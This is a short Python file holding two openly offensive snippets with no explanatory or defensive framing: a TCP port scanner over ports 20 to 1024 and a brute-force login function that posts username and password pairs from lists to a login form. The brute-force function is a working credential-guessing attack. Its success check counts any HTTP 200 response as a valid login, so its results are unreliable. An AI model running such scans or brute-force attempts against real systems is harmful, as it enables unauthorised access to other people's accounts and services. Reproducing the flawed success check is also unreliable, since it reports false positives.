#.Port Scanner
import socket

def port_scanner(host):
    print(f"Scanning ports on {host}...")
    for port in range(20, 1025):
        s = socket.socket()
        s.settimeout(0.5)
        try:
            s.connect((host, port))
            print(f"Port {port} is open")
        except:
            pass
        s.close()

# Example
port_scanner("127.0.0.1")


#. BRUTE FORCE LOGIN
import requests

def brute_force_login(url, username_list, password_list):
    for username in username_list:
        for password in password_list:
            data = {'username': username, 'password': password}
            response = requests.post(url, data=data)
            if "Welcome" in response.text or response.status_code == 200:
                print(f"Valid login found: {username}:{password}")
                return

# Usage
brute_force_login("http://example.com/login", ["admin", "user"], ["1234", "admin123"])
